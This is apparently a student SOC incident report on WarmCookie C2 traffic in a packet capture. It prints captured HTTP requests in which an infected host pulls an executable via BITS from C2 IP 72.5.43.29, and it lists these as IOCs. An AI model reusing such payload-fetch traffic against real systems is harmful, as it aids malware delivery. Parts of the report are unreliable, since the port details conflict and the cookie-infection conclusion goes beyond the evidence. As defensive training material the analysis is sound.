## Incident Report — WARMCOOKIE C2 Traffic Analysis

## Scenario
LAN segment details:
LAN segment range:  10.8.15[.]0/24 (10.8.15[.]0 through 10.8.15[.]255)
Domain:  lafontainebleu[.]org
Active Directory (AD) domain controller:  10.8.15[.]4 - WIN-JEGJIX7Q9RS
AD environment name:  LAFONTAINBLEU
LAN segment gateway:  10.8.15[.]1
LAN segment broadcast address:  10.8.15[.]255

## Tools Used
- wireshark
- virustotal.com
- abuseipdb.com
- shodan.io
  
## Investigation Steps (step by step what you did)
1. After opening the pcap file, i applied a filter which was ip.src == 10.8.15.0/24 or ip.dst == 10.8.15.0/24.
2. I inputted this filter ip.src == 10.8.15.0/24 or ip.dst == 10.8.15.0/24 which showed me the internal and the external traffics.
3. I looked for the infected machine and the hint was to find the ip address address that occurred the most and it was 10.8.15.133.
4. The way i found it was that, i went to statistics and clicked on conversations which showed me the ip address that occurred the most.
5. I later clicked on the endpoints in the statistics tab which showed me the number of the packet the infected machine has been sending and what external ip addresses it was talking to the most
6. i found out the number of packets it was sending which were 3,797 packets and the external IP it was talking to the most was 72.5.43.29
7. i checked up the ip address on virustotal.com and it was flagged as Malicious by ADMINUSLabs, alphaMountain.ai, BitDefender, Chong Lua Dao,
8. CyRadar, Dr.Web, ESET, Forcepoint ThreatSeeker, Fortinet, G-Data, Gridinsoft, Kaspersky, Lionic, SOCRadar ( Phishing ), webroot.
9. there were no results in abuseipd.com & shodan.io but it didn't mean the traffic was clean. it was the C2 server.
10. i used this filter  ip.addr == 72.5.43.29 to filter the traffic.
11. I looked at the protocol and it was a TCP & HTTP and the ports were quite unusal. TCP src port 49810 & dst 80 http src 49610 dst 80
12. i followed the HTTP stream to check if the information in the stream were readable texts or they were gibberish and they were readable & gibberish.
13. the readable texts followed a particular pattern

HEAD /data/0f60a3e7baecf2748b1c8183ed37d1e4 HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
Host: 72.5.43.29

HTTP/1.1 200 OK
Content-Length: 159232
Date: Thu, 15 Aug 2024 00:12:00 GMT

GET /data/0f60a3e7baecf2748b1c8183ed37d1e4 HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
Host: 72.5.43.29

HTTP/1.1 200 OK
Content-Length: 159232
Date: Thu, 15 Aug 2024 00:12:00 GMT
Content-Type: text/html; charset=ISO-8859-1

14. The HTTP method that was being used was the GET method. An HTTP GET request is a method used request and retrieve data from a specified resource on a web server.

GET /data/0f60a3e7baecf2748b1c8183ed37d1e4 HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
Host: 72.5.43.29
MZ......................@.............................................	.!..L.!This program cannot be run in DOS mode.

The Microsoft BITS stands for Background Intelligent Transfer Service. 
It is a built-in Windows system service that downloads and uploads files in the background using idle network bandwidth, 
ensuring your computer's internet connection remains fast and responsive for your active apps and daily activities.

The MZ at the start of a file indicates that it is an executable file, 
such as a .exe or .dll. It is a magic number (or signature) that signals the operating system that the downloaded content contains program instructions that can be run or loaded.


## Findings
- Infected IP - 10.8.15.133
- Malware Family: WarmCookie
- C2 Server IP - 72.5.43.29
- C2 Port - src port: 49810 dst: 80
- Protocol used: HTTP

## Indicators of Compromise (IOCs)
- GET /data/0f60a3e7baecf2748b1c8183ed37d1e4 HTTP/1.1
User-Agent: Microsoft BITS/7.8
- MZ......................@.............................................	.!..L.!This program cannot be run in DOS mode.

## Conclusion
the host machine got infected by an accepted cookie from malicious website. 
The attacker now established C2 communication and used a legitimate software called BITS 
to download a malicious software in the background to evade detection by the user and security tools that something malicious 
is being downloaded and execute the payload on the infected machine.

## What This Taught Me About SOC Work
- Attackers abuse legitimate Windows tools like BITS to download malware, making detection harder because the traffic blends in with normal system activity
- An MZ header in downloaded content is an immediate red flag; it means an executable was transferred, which warrants immediate investigation
- Living off the Land attacks require SOC analysts to monitor not just suspicious tools but also trusted Windows services like BITS, WMI, and PowerShell.
